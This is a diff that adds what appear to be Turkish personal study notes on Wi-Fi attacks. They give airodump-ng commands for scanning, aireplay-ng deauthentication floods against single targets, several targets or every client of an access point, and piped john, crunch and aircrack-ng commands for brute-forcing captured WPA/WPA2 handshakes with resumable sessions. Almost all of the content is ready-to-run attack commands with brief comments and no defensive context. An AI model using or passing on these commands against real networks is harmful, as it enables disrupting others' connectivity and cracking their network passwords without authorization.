@@ -1,0 +1,44 @@
+Seviye2
+
+
+1-) Linux Piping
+
+2-) Yetkisizlendirme
+
+airodump-ng wlan0
+
+airodump-ng --bssid <mac> --channel <ch> wlan0
+
+aireplay-ng --deauth 10000 -a <mac_of_mode> -c <mac_of_target> wlan0
+
+
+birden fazla hedefe saldırma
+
+aireplay-ng --deauth 100 -a <mac_of_modem> -c <mac_of_target> & /dev/null&
+
+daha sonra:
+
+jobs // bu komut çalışan aktif paketleri gösterir
+
+aireplay-ng --deauth 1000 -a <mac_of_modem> wlan0 //bütün cihazlara saldırı yapar.
+
+
+WPA/WPA2 Şifreleri Kırma:
+
+john
+
+john --wordlist=wordlist.txt --stdout --session=omer | aircrack-ng --bssid <mac_of_modem> handshake.cap -w -
+
+
+john --restore=omer | aircrack-ng --bssid <mac_of_modem> handshske.cap -w - //kaldığı yerden devam eder.
+
+crunch 8 8 | aircrack-ng --bssid <mac_of_modem> handshake.cap -w - //var olan 8 basamaklı bütün kombinasyonları kaydetmeden aircrack atıp deniyor.
+
+
+crunch 8 8 | john --stdin --session=omer --stdout | aircrack-ng --bssid <mac_of_modem> handshake.cap -w -  //var olan 8 basamaklı kombinasyonları denerken yarıda bırakıp tekrar başlamamızı sağlar.
+
+Tekrar kaldığın yerden başlamak için:
+
+crunch 8 8 | john --restore=omer | aircrack-ng --bssid <mac_of_modem> handshake.cap -w - //kaldığı yerden denemeye devam eder.
+
+
